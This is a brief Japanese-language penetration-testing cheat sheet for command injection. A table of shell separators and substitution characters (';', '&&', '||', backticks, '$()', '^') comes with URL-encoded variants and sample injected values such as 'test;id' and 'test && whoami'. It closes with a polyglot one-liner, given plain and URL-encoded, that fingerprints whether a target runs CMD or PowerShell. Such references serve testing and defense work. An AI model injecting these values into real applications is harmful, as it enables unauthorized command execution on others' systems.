## Bypassing Command
全部試行すること

| 記号   | 用途             | 試行例                      | 備考      |
| ---- | -------------- | ------------------------ | ------- |
| ;    | コマンド区切り        | test;id                  | よく使われる  |
| &&   | 前のコマンド成功時に次を実行 | test && whoami           | linux   |
| \|\| | 前の失敗時に次を実行     | false \|\| whoami        |         |
| \|   | パイプ            | ipconfig \| findstr IPv4 |         |
| `    | コマンド置換         | ``` `commnad` ```        | linux   |
| $    | コマンド置換         | $(command)               | linux   |
| "    | ダブルクォート有無で変化   | "command"                |         |
| '    | クォート有無で変化      | 'command'                |         |
| ^    | CMDでのエスケープバイパス | ^&                       | windows |
| \    | エスケープや改行改行継続   | echo line1\necho line2   |         |
| %0a  | 改行のURLエンコード    | %0aCOMMAND               |         |
| %3B  | ;のURLエンコード     | test%3Bid                |         |
| %26  | &のURLエンコード     | test%26id                |         |

## Check PowerShell or CMD
plain comand
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL encofing
```
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```